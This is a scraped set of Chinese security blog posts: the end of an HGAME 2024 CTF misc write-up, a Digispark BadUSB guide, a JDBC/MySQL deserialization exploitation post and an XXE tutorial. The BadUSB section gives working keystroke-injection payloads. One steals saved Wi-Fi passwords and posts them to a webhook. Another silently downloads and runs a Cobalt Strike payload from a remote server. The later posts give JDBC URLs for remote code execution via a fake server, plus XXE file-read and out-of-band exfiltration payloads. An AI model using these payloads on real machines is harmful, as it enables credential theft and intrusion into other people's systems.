\u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;;\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;\u0026#39;\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;\u0026lt;GA\u0026gt;\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;,\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;.\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} shiftKeys = {\u0026#34;04\u0026#34;: \u0026#34;A\u0026#34;, \u0026#34;05\u0026#34;: \u0026#34;B\u0026#34;, \u0026#34;06\u0026#34;: \u0026#34;C\u0026#34;, \u0026#34;07\u0026#34;: \u0026#34;D\u0026#34;, \u0026#34;08\u0026#34;: \u0026#34;E\u0026#34;, \u0026#34;09\u0026#34;: \u0026#34;F\u0026#34;, \u0026#34;0a\u0026#34;: \u0026#34;G\u0026#34;, \u0026#34;0b\u0026#34;: \u0026#34;H\u0026#34;, \u0026#34;0c\u0026#34;: \u0026#34;I\u0026#34;, \u0026#34;0d\u0026#34;: \u0026#34;J\u0026#34;, \u0026#34;0e\u0026#34;: \u0026#34;K\u0026#34;, \u0026#34;0f\u0026#34;: \u0026#34;L\u0026#34;, \u0026#34;10\u0026#34;: \u0026#34;M\u0026#34;, \u0026#34;11\u0026#34;: \u0026#34;N\u0026#34;, \u0026#34;12\u0026#34;: \u0026#34;O\u0026#34;, \u0026#34;13\u0026#34;: \u0026#34;P\u0026#34;, \u0026#34;14\u0026#34;: \u0026#34;Q\u0026#34;, \u0026#34;15\u0026#34;: \u0026#34;R\u0026#34;, \u0026#34;16\u0026#34;: \u0026#34;S\u0026#34;, \u0026#34;17\u0026#34;: \u0026#34;T\u0026#34;, \u0026#34;18\u0026#34;: \u0026#34;U\u0026#34;, \u0026#34;19\u0026#34;: \u0026#34;V\u0026#34;, \u0026#34;1a\u0026#34;: \u0026#34;W\u0026#34;, \u0026#34;1b\u0026#34;: \u0026#34;X\u0026#34;, \u0026#34;1c\u0026#34;: \u0026#34;Y\u0026#34;, \u0026#34;1d\u0026#34;: \u0026#34;Z\u0026#34;, \u0026#34;1e\u0026#34;: \u0026#34;!\u0026#34;, \u0026#34;1f\u0026#34;: \u0026#34;@\u0026#34;, \u0026#34;20\u0026#34;: \u0026#34;#\u0026#34;, \u0026#34;21\u0026#34;: \u0026#34;$\u0026#34;, \u0026#34;22\u0026#34;: \u0026#34;%\u0026#34;, \u0026#34;23\u0026#34;: \u0026#34;^\u0026#34;, \u0026#34;24\u0026#34;: \u0026#34;\u0026amp;\u0026#34;, \u0026#34;25\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;26\u0026#34;: \u0026#34;(\u0026#34;, \u0026#34;27\u0026#34;: \u0026#34;)\u0026#34;, \u0026#34;28\u0026#34;: \u0026#34;\u0026lt;RET\u0026gt;\u0026#34;, \u0026#34;29\u0026#34;: \u0026#34;\u0026lt;ESC\u0026gt;\u0026#34;, \u0026#34;2a\u0026#34;: \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;, \u0026#34;2b\u0026#34;: \u0026#34;\\t\u0026#34;, \u0026#34;2c\u0026#34;: \u0026#34;\u0026lt;SPACE\u0026gt;\u0026#34;, \u0026#34;2d\u0026#34;: \u0026#34;_\u0026#34;, \u0026#34;2e\u0026#34;: \u0026#34;+\u0026#34;, \u0026#34;2f\u0026#34;: \u0026#34;{\u0026#34;, \u0026#34;30\u0026#34;: \u0026#34;}\u0026#34;, \u0026#34;31\u0026#34;: \u0026#34;|\u0026#34;, \u0026#34;32\u0026#34;: \u0026#34;\u0026lt;NON\u0026gt;\u0026#34;, \u0026#34;33\u0026#34;: \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;34\u0026#34;: \u0026#34;:\u0026#34;, \u0026#34;35\u0026#34;: \u0026#34;~\u0026#34;, \u0026#34;36\u0026#34;: \u0026#34;\u0026lt;\u0026#34;, \u0026#34;37\u0026#34;: \u0026#34;\u0026gt;\u0026#34;, \u0026#34;38\u0026#34;: \u0026#34;?\u0026#34;, \u0026#34;39\u0026#34;: \u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;, \u0026#34;3a\u0026#34;: \u0026#34;\u0026lt;F1\u0026gt;\u0026#34;, \u0026#34;3b\u0026#34;: \u0026#34;\u0026lt;F2\u0026gt;\u0026#34;, \u0026#34;3c\u0026#34;: \u0026#34;\u0026lt;F3\u0026gt;\u0026#34;, \u0026#34;3d\u0026#34;: \u0026#34;\u0026lt;F4\u0026gt;\u0026#34;, \u0026#34;3e\u0026#34;: \u0026#34;\u0026lt;F5\u0026gt;\u0026#34;, \u0026#34;3f\u0026#34;: \u0026#34;\u0026lt;F6\u0026gt;\u0026#34;, \u0026#34;40\u0026#34;: \u0026#34;\u0026lt;F7\u0026gt;\u0026#34;, \u0026#34;41\u0026#34;: \u0026#34;\u0026lt;F8\u0026gt;\u0026#34;, \u0026#34;42\u0026#34;: \u0026#34;\u0026lt;F9\u0026gt;\u0026#34;, \u0026#34;43\u0026#34;: \u0026#34;\u0026lt;F10\u0026gt;\u0026#34;, \u0026#34;44\u0026#34;: \u0026#34;\u0026lt;F11\u0026gt;\u0026#34;, \u0026#34;45\u0026#34;: \u0026#34;\u0026lt;F12\u0026gt;\u0026#34;} output = [] last = [] new = [] keys = open(\u0026#39;hgame2.txt\u0026#39;) press = \u0026#39;\u0026#39; for line in keys: try: if line[2]!=\u0026#39;0\u0026#39; or (line[3]!=\u0026#39;0\u0026#39; and line[3]!=\u0026#39;2\u0026#39;): continue offset = 6 new = [] while line[offset:offset+2] != \u0026#39;00\u0026#39;: press = line[offset:offset+2] if press in normalKeys.keys(): if line[3]==\u0026#39;0\u0026#39;: key = normalKeys[press] else: key = shiftKeys[press] else: key = \u0026#39;[unknown]\u0026#39; if press not in last: output.append(key) new.append(press) offset += 2 except: print(line) finally: last = new keys.close() flag=0 for i in range(len(output)): try: if output[i]==\u0026#34;\u0026lt;CAP\u0026gt;\u0026#34;: flag = 1-flag if flag!=0: output[i]=output[i].upper() except: pass output = [x for x in output if x != \u0026#39;\u0026lt;CAP\u0026gt;\u0026#39;] new_output = [] for i in range(len(output)): if output[i] == \u0026#34;\u0026lt;DEL\u0026gt;\u0026#34;: new_output = new_output[:-1] else: new_output.append(output[i]) print (\u0026#34;\u0026#34;.join(new_output)) 运行结果:hgame{keYb0a1d_gam0__15_s0_f0n__!!~~~~}\n2.maybezip 根据题目名，结合文件并非zip，想到需要对文件内容异或得到原zip文件 根据zip文件的固定文件头，504B0304，找到异或数字 0x27,可以直接在winhex里异或，也能写脚本\ndef xor_with_0x27(input_file, output_file): with open(input_file, \u0026#39;rb\u0026#39;) as f: data = f.read() xor_data = bytearray([b ^ 0x27 for b in data]) with open(output_file, \u0026#39;wb\u0026#39;) as f: f.write(xor_data) # 使用xor函数 xor_with_0x27(\u0026#39;maybezip\u0026#39;, \u0026#39;output.zip\u0026#39;) output.zip里文件修改日期有明显的01特征，提取出来\nimport zipfile import json from datetime import datetime def get_all_file_modification_time(zip_path): result = {} with zipfile.ZipFile(zip_path, \u0026#39;r\u0026#39;) as myzip: for file in myzip.namelist(): info = myzip.getinfo(file) mod_time = datetime(*info.date_time) result[file] = str(mod_time) return result # 使用函数并保存结果为json result = get_all_file_modification_time(\u0026#39;output.zip\u0026#39;) with open(\u0026#39;output.json\u0026#39;, \u0026#39;w\u0026#39;) as f: json.dump(result, f) 再对拿到的json数据操作一下\nimport json # 读取json文件 with open(\u0026#39;output.json\u0026#39;, \u0026#39;r\u0026#39;) as f: data = json.load(f) string_of_01 =\u0026#39;\u0026#39; # 遍历json数据 for file, time in data.items(): # 检查文件名是否在指定范围内 if \u0026#39;out/\u0026#39; in file and \u0026#39;png\u0026#39; in file: file_number = int(file.split(\u0026#39;/\u0026#39;)[1].split(\u0026#39;.\u0026#39;)[0]) if file_number \u0026gt;= 1 and file_number \u0026lt;= 118: # 检查时间的最后一位是否为0 if time[-1] == \u0026#39;0\u0026#39;: print(f\u0026#34;{file_number} - 0\u0026#34;) string_of_01 += \u0026#39;0\u0026#39; else: print(f\u0026#34;{file_number} - 1\u0026#34;) string_of_01 += \u0026#39;1\u0026#39; print(string_of_01) # 二进制转ascii字符串 def binary_to_string(binary): result = \u0026#39;\u0026#39; for i in range(0, len(binary), 8): byte = binary[i:i+8] result += chr(int(byte,2)) #从二进制转为十进制 # 忽略不可见字符 result = \u0026#39;\u0026#39;.join([i if ord(i) \u0026gt; 31 and ord(i) \u0026lt; 127 else \u0026#39;\u0026#39; for i in result]) return result key_of_zip = binary_to_string(string_of_01) print(key_of_zip) 得到压缩包密码 what_is_tupper 解压缩得到一段数字，结合压缩包密码的tupper，想到tupper自指，在线工具画一下图\n这是micro qrcode，找个工具扫一下，可以用Scanbot SDK 扫描内容为：Matryo5hk4_d01l\n","permalink":"https://blog.w8nn9z.top/posts/ctf/hgame-2024-misc-writeup/","summary":"","title":"HGAME 2024 MISC Writeup"},{"content":"环境配置 arduino 1.8.4\n开发板管理网址：https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json\n开发板管理器：Digistump AVR Boards\n安装驱动：https://github.com/digistump/digistumparduino/releases\npayloads 各种payloads：https://github.com/MTK911/Attiny85\n烧录点击上传即可，之后根据提示插入badusb：\n窃取wifi密码：\n#include \u0026#34;DigiKeyboard.h\u0026#34; void setup() { pinMode(1, OUTPUT); //LED on Model A } void loop() { DigiKeyboard.update(); DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(3000); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run DigiKeyboard.delay(100); DigiKeyboard.println(\u0026#34;cmd\u0026#34;); DigiKeyboard.delay(500); DigiKeyboard.println(\u0026#34;cd %temp%\u0026#34;); //Jumping to temporary dir DigiKeyboard.delay(300); DigiKeyboard.println(\u0026#34;netsh wlan export profile key=clear\u0026#34;); //grabbing all the saved wifi passwd and saving them in temporary dir DigiKeyboard.delay(2000); DigiKeyboard.println(\u0026#34;powershell Select-String -Path WLAN*.xml -Pattern \u0026#39;keyMaterial\u0026#39; \u0026gt; Wi-Fi-PASS\u0026#34;); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir DigiKeyboard.delay(1000); DigiKeyboard.println(\u0026#34;powershell Invoke-WebRequest -Uri your-webhook-website -Method POST -InFile Wi-Fi-PASS\u0026#34;); //Submitting all passwords on hook DigiKeyboard.delay(2000); DigiKeyboard.println(\u0026#34;del WLAN-* /s /f /q\u0026#34;); //cleaning up all the mess DigiKeyboard.delay(1000); DigiKeyboard.println(\u0026#34;exit\u0026#34;); DigiKeyboard.delay(100); digitalWrite(1, HIGH); //turn on led when program finishes DigiKeyboard.delay(10000); digitalWrite(1, LOW); DigiKeyboard.delay(5000); } cs上线：\n#include \u0026#34;DigiKeyboard.h\u0026#34; void setup() { pinMode(1, OUTPUT); //LED on Model A } void loop() { const char* download_url = \u0026#34;http://vps/artifact2.exe\u0026#34;; DigiKeyboard.update(); DigiKeyboard.sendKeyStroke(0); DigiKeyboard.delay(3000); DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run DigiKeyboard.delay(100); DigiKeyboard.println(\u0026#34;cmd\u0026#34;); DigiKeyboard.delay(500); DigiKeyboard.println(\u0026#34;cd %temp%\u0026#34;); //Jumping to temporary dir DigiKeyboard.delay(300); DigiKeyboard.print(\u0026#34;powershell -WindowStyle Hidden -C \\\u0026#34;$u=\u0026#39;\u0026#34;); DigiKeyboard.print(download_url); DigiKeyboard.print(\u0026#34;\u0026#39;;Invoke-WebRequest -Uri $u -OutFile \\\u0026#34;something.exe\\\u0026#34;;Start-Process -FilePath \\\u0026#34;something.exe\\\u0026#34;;\\\u0026#34;\u0026#34;); DigiKeyboard.println(\u0026#34;\u0026#34;); DigiKeyboard.println(\u0026#34;exit\u0026#34;); DigiKeyboard.delay(100); digitalWrite(1, HIGH); //turn on led when program finishes DigiKeyboard.delay(10000); digitalWrite(1, LOW); DigiKeyboard.delay(5000); } 参考资料 https://ares-x.com/2018/01/17/%E4%BD%BF%E7%94%A8Digispark%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84BadUSB/\n","permalink":"https://blog.w8nn9z.top/posts/misc/badusb/","summary":"","title":"Digispark BadUSB"},{"content":"环境：jdk8u65 mysql 8.0.19 commons-collections 3.2.1\npom.xml：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;project xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;modelVersion\u0026gt;4.0.0\u0026lt;/modelVersion\u0026gt; \u0026lt;groupId\u0026gt;org.example\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;JDBC\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0-SNAPSHOT\u0026lt;/version\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;project.build.sourceEncoding\u0026gt;UTF-8\u0026lt;/project.build.sourceEncoding\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.19\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/project\u0026gt; JDBC JDBC (Java Database Connectivity) 作为接口实现的标准，对于不同的数据库有着不同的实现：\nJDBC基本使用 两种使用方法\nimport java.sql.Connection; import java.sql.DriverManager; import java.sql.Statement; import java.sql.ResultSet; public class JDBCTest { public static void main(String[] args) throws Exception{ String url = \u0026#34;jdbc:mysql://localhost:3306/test?serverTimezone=UTC\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;password\u0026#34;; // Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;); Connection conn = DriverManager.getConnection(url, username, password); // 使用 connection 执行数据库操作 Statement stmt = conn.createStatement(); String sql = \u0026#34;SELECT * FROM user\u0026#34;; ResultSet rs = stmt.executeQuery(sql); while(rs.next()){ System.out.println(rs.getString(\u0026#34;name\u0026#34;)+\u0026#34; 年龄：\u0026#34;+rs.getInt(\u0026#34;age\u0026#34;)); } } } import java.sql.Connection; import java.sql.Statement; import java.sql.ResultSet; import java.sql.Driver; import java.util.Properties; public class JDBCTest { public static void main(String[] args) throws Exception{ String url = \u0026#34;jdbc:mysql://127.0.0.1:3306/test?serverTimezone=UTC\u0026#34;; Properties props = new Properties(); props.setProperty(\u0026#34;user\u0026#34;, \u0026#34;root\u0026#34;); props.setProperty(\u0026#34;password\u0026#34;, \u0026#34;password\u0026#34;); // Driver driver = new com.mysql.jdbc.Driver(); Driver driver = new com.mysql.cj.jdbc.Driver(); Connection conn = driver.connect(url, props); // 使用 connection 执行数据库操作 Statement stmt = conn.createStatement(); String sql = \u0026#34;SELECT * FROM user\u0026#34;; ResultSet rs = stmt.executeQuery(sql); while(rs.next()){ System.out.println(rs.getString(\u0026#34;name\u0026#34;)+\u0026#34; 年龄：\u0026#34;+rs.getInt(\u0026#34;age\u0026#34;)); } } } ServerStatusDiffInterceptor链 在 jdbc url 中设定属性 queryInterceptors 为 ServerStatusDiffInterceptor 时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法\nServerStatusDiffInterceptor链：ServerStatusDiffInterceptor.postProcess -\u0026gt; ServerStatusDiffInterceptor.populateMapWithSessionStatusValues -\u0026gt; ResultSetUtil.resultSetToMap -\u0026gt; rs.getObject(即ResultSetImpl.getObject) -\u0026gt; objIn.readObject\n需要注意的是 ResultSetImpl.getObject 中需要设置 autoDeserialize 为true才能调用到最后的反序列化：\nif (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) { Object obj = data; if ((data != null) \u0026amp;\u0026amp; (data.length \u0026gt;= 2)) { if ((data[0] == -84) \u0026amp;\u0026amp; (data[1] == -19)) { // Serialized object? try { ByteArrayInputStream bytesIn = new ByteArrayInputStream(data); ObjectInputStream objIn = new ObjectInputStream(bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException cnfe) { throw SQLError.createSQLException(Messages.getString(\u0026#34;ResultSet.Class_not_found___91\u0026#34;) + cnfe.toString() + Messages.getString(\u0026#34;ResultSet._while_reading_serialized_object_92\u0026#34;), getExceptionInterceptor()); } catch (IOException ex) { obj = data; // not serialized? } } else { return getString(columnIndex); } } return obj; } 最后反序列化的数据是数据库服务器返回给请求的内容\n因此jdbc url需要设置两个基本属性来满足反序列化条件： queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;autoDeserialize=true\n后续根据不同的环境条件打不同的链子，比如本次环境为 commons-collections 3.2.1 就可以打CC6链，需要最后返回进行反序列化的数据就是CC6链序列化后的结果，网络数据包需要满足协议格式才可以进行数据库服务的伪造\n伪造服务器可以直接用 mysql-fake-server 工具来实现，payload从user参数传递，也就是代码中进行连接时的url后的参数：\njdbc:mysql://127.0.0.1:3308/test?autoDeserialize=true\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;user=deser_CC31_calc.exe 可以用cli版本直接伪造服务：\npoc：\nimport java.sql.Connection; import java.sql.DriverManager; public class JDBCTest { public static void main(String[] args) throws Exception{ String url = \u0026#34;jdbc:mysql://127.0.0.1:3308/test?autoDeserialize=true\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;; String username = \u0026#34;deser_CC31_calc.exe\u0026#34;; String password = \u0026#34;1\u0026#34;; // Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;); Connection conn = DriverManager.getConnection(url, username, password); } } 另一种使用方式同理：\ndetectCustomCollations链 detectCustomCollations链：ConnectionImpl.buildCollationMapping -\u0026gt; Util.resultSetToMap -\u0026gt; rs.getObject(即ResultSetImpl.getObject)\nConnectionImpl.buildCollationMapping 中需要满足getDetectCustomCollations()为true才能进入Util.resultSetToMap：\nif (versionMeetsMinimum(4, 1, 0) \u0026amp;\u0026amp; getDetectCustomCollations()) { java.sql.Statement stmt = null; java.sql.ResultSet results = null; try { sortedCollationMap = new TreeMap\u0026lt;Long, String\u0026gt;(); customCharset = new HashMap\u0026lt;Integer, String\u0026gt;(); customMblen = new HashMap\u0026lt;String, Integer\u0026gt;(); stmt = getMetadataSafeStatement(); try { results = stmt.executeQuery(\u0026#34;SHOW COLLATION\u0026#34;); if (versionMeetsMinimum(5, 0, 0)) { Util.resultSetToMap(sortedCollationMap, results, 3, 2); ResultSetImpl.getObject 中需要满足 getAutoDeserialize() 为true才能调用到最后的反序列化\nif (this.connection.getAutoDeserialize()) { Object obj = data; if ((data != null) \u0026amp;\u0026amp; (data.length \u0026gt;= 2)) { if ((data[0] == -84) \u0026amp;\u0026amp; (data[1] == -19)) { // Serialized object? try { ByteArrayInputStream bytesIn = new ByteArrayInputStream( data); ObjectInputStream objIn = new ObjectInputStream( bytesIn); obj = objIn.readObject(); objIn.close(); bytesIn.close(); } catch (ClassNotFoundException cnfe) { throw SQLError.createSQLException( Messages .getString(\u0026#34;ResultSet.Class_not_found___91\u0026#34;) //$NON-NLS-1$ + cnfe.toString() + Messages .getString(\u0026#34;ResultSet._while_reading_serialized_object_92\u0026#34;), getExceptionInterceptor()); //$NON-NLS-1$ } catch (IOException ex) { obj = data; // not serialized? } } else { return getString(columnIndex); } } return obj; } 因此jdbc url需要设置两个基本属性来满足反序列化条件： detectCustomCollations=true\u0026amp;autoDeserialize=true\n同样利用 mysql-fake-server 工具来搭建服务和生成payload：\njdbc:mysql://ip:port/test?detectCustomCollations=true\u0026amp;autoDeserialize=true\u0026amp;user=deser_CC31_calc.exe poc：\nimport java.sql.Connection; import java.sql.DriverManager; public class JDBCTest { public static void main(String[] args) throws Exception{ String url = \u0026#34;jdbc:mysql://127.0.0.1:3308/test?detectCustomCollations=true\u0026amp;autoDeserialize=true\u0026#34;; String username = \u0026#34;deser_CC31_calc.exe\u0026#34;; String password = \u0026#34;1\u0026#34;; // Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;); Connection conn = DriverManager.getConnection(url, username, password); } } 总结 根据不同的sql版本有一些属性名的区别，但本质上还是上面两条链：\n5.1.10 - 5.1.18 不调用resultSeToMap poc：\nimport java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.ResultSet; public class JDBCTest { public static void main(String[] args) throws Exception{ String url = \u0026#34;jdbc:mysql://127.0.0.1:3308/test?autoDeserialize=true\u0026amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;; String username = \u0026#34;deser_CC31_calc.exe\u0026#34;; String password = \u0026#34;1\u0026#34;; // Class.forName(\u0026#34;com.mysql.jdbc.Driver\u0026#34;); Connection conn = DriverManager.getConnection(url, username, password); String sql = \u0026#34;\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); //执行查询操作，返回的是数据库结果集的数据表 ResultSet resultSet = ps.executeQuery(); } } 5.1.19 - 5.1.28：\njdbc:mysql://ip:port/test?autoDeserialize=true\u0026amp;user=deser_CC31_calc.exe 5.1.29 - 5.1.48\njdbc:mysql://ip:port/test?detectCustomCollations=true\u0026amp;autoDeserialize=true\u0026amp;user=deser_CC31_calc.exe 6.02 - 6.06\njdbc:mysql://ip:port/test?autoDeserialize=true\u0026amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;user=deser_CC31_calc.exe 8.07 - 8.20\njdbc:mysql://ip:port/test?autoDeserialize=true\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;user=deser_CC31_calc.exe 参考资料： https://xz.aliyun.com/news/18822\nhttps://xz.aliyun.com/news/7754\nhttps://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html\nhttps://github.com/4ra1n/mysql-fake-server\n","permalink":"https://blog.w8nn9z.top/posts/web/jdbc/","summary":"","title":"JDBC反序列化"},{"content":"XML XML基本格式：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!-- version:当前文档使用的版本 encoding:当前文档使用的编码 --\u0026gt; \u0026lt;note date=\u0026#34;12/11/2007\u0026#34;\u0026gt; \u0026lt;!-- 根元素note，同时也是to from heading body 的父元素 --\u0026gt; \u0026lt;to\u0026gt;Tove\u0026lt;/to\u0026gt; \u0026lt;from\u0026gt;Jani\u0026lt;/from\u0026gt; \u0026lt;heading\u0026gt;Reminder\u0026lt;/heading\u0026gt; \u0026lt;body\u0026gt;Don\u0026#39;t forget me this weekend!\u0026lt;/body\u0026gt; \u0026lt;/note\u0026gt; XML文档由元素构成，每个元素包括开始标签、结束标签和元素内容，XML 属性值必须加引号，比如例子中的date\nDTD DTD 的目的是定义 XML 文档的结构以及法律元素和属性，可以在内部声明，也可以被外部引用\n\u0026lt;!DOCTYPE note [ \u0026lt;!ELEMENT note (to,from,heading,body)\u0026gt; \u0026lt;!ELEMENT to (#PCDATA)\u0026gt; \u0026lt;!ELEMENT from (#PCDATA)\u0026gt; \u0026lt;!ELEMENT heading (#PCDATA)\u0026gt; \u0026lt;!ELEMENT body (#PCDATA)\u0026gt; ]\u0026gt; 例子中!DOCTYPE 指定根元素 note，!ELEMENT 先定义note必须包含的子元素，再分别定义各个子元素类型\nPCDATA和CDATA的区别：\nPCDATA：会解析一些特殊符号，比如\u0026lt;，里面如果要用到符号的字符必须使用预定义实体\rCDATA：完全不解析，全部当作文本内容 ENTITY DTD实体分为通用实体和参数实体，还要注意一些特殊符号在XML中有特定作用，需要字符时要使用预定义实体，常用的五个：\n\u0026lt; - \u0026amp;lt;\r\u0026gt; - \u0026amp;gt;\r\u0026amp; - \u0026amp;amp;\r\u0026#34; - \u0026amp;quot;\r\u0026#39; - \u0026amp;apos; 通用实体，引用时使用符号\u0026amp;：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY writer \u0026#34;Dawn\u0026#34;\u0026gt;]\u0026gt; \u0026lt;test\u0026gt; \u0026amp;writer; \u0026lt;/test\u0026gt; 引用外部实体通常使用SYSTEM ，也可以使用PUBLIC，但是需要public id：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt; \u0026lt;test\u0026gt; \u0026amp;file; \u0026lt;/test\u0026gt; 参数实体，引用时使用符号%，且只能在DTD文档中使用：\n\u0026lt;?xml version = \u0026#34;1.0\u0026#34; encoding = \u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY %writer \u0026#34;Dawn\u0026#34;\u0026gt; %writer ] \u0026gt; XXE 常用file协议来读取敏感文件，根据不同的解析语言还可以使用不同的协议，如php伪协议\n常规XXE 通用实体：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt; \u0026lt;test\u0026gt; \u0026amp;file; \u0026lt;/test\u0026gt; 参数实体：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY % start \u0026#34;\u0026lt;![CDATA[\u0026#34;\u0026gt; \u0026lt;!ENTITY % xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % end \u0026#34;]]\u0026gt;\u0026#34;\u0026gt; \u0026lt;!ENTITY % dtd SYSTEM \u0026#34;http://ip:port/evil.dtd\u0026#34;\u0026gt; %dtd;]\u0026gt; \u0026lt;test\u0026gt; \u0026amp;all; \u0026lt;/test\u0026gt; evil.dtd：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!ENTITY all \u0026#34;%start;%xxe;%end;\u0026#34; \u0026gt; OOB XXE XXE外带：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY % remote SYSTEM \u0026#34;http://ip:port/evil.dtd\u0026#34;\u0026gt; %remote;%int;%send; ]\u0026gt; evil.dtd：\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=/etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % int \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; send SYSTEM \u0026#39;http://ip:port/?p=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; 报错XXE 如果正常解析无回显并且开启了报错就可以利用XXE的报错来带出数据：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE message [ \u0026lt;!ENTITY % ext SYSTEM \u0026#34;http://ip:port/evil.dtd\u0026#34;\u0026gt; %ext; ]\u0026gt; 